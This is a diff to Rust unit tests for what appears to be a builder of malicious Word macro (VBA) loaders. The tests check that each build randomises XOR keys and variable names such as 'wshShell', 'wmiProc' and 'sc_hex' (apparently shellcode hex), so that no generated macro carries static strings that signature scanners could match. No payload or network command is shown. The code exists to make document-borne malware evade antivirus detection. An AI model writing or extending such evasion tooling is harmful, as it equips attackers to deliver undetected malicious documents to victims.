@@ -246,12 +246,32 @@ fn vba_word_no_hardcoded_comments() {
 fn vba_two_builds_produce_different_registry_arrays() {
     let src1 = generate_vba_source(&base_config(LoaderType::DocxMacro)).unwrap();
     let src2 = generate_vba_source(&base_config(LoaderType::DocxMacro)).unwrap();
-    // Registry XOR key differs per build → the encoded integer sequence differs
-    let find_vmcodes_line = |s: &str| -> String {
-        s.lines().find(|l| l.contains("vmCodes(0)=")).unwrap_or("").to_string()
+    // Registry XOR key differs per build → the encoded integer sequence differs.
+    // Variable name is now randomised too, so search for (0)= pattern (no spaces = array init line).
+    let find_first_reg_line = |s: &str| -> String {
+        s.lines().find(|l| l.contains("(0)=") && !l.contains("&H")).unwrap_or("").to_string()
     };
-    assert_ne!(find_vmcodes_line(&src1), find_vmcodes_line(&src2),
-        "VBA registry arrays must differ between builds (per-build XOR key)");
+    assert_ne!(find_first_reg_line(&src1), find_first_reg_line(&src2),
+        "VBA registry arrays must differ between builds (per-build XOR key + randomised var name)");
+}
+
+#[test]
+fn vba_two_builds_produce_different_local_var_names() {
+    let src1 = generate_vba_source(&base_config(LoaderType::DocxMacro)).unwrap();
+    let src2 = generate_vba_source(&base_config(LoaderType::DocxMacro)).unwrap();
+    // Static local var names must NOT appear verbatim in generated VBA output.
+    // Trailing space prevents false positives from substrings in longer names.
+    for name in &["vmCodes", "wshShell", "vbCodes", "wmiSvc3", "wmiProc ",
+                  "sc_hex ", "key_hex ", "_fnGcp "] {
+        assert!(!src1.contains(name),
+            "VBA output must not contain static var name {:?}", name);
+    }
+    // Any XOR decode line differs because var names AND XOR key are both randomised per build
+    let xor_line = |s: &str| -> String {
+        s.lines().find(|l| l.contains(") Xor ")).unwrap_or("").to_string()
+    };
+    assert_ne!(xor_line(&src1), xor_line(&src2),
+        "VBA XOR-decode line must differ between builds (var names + XOR key both randomised)");
 }
 
 #[test]
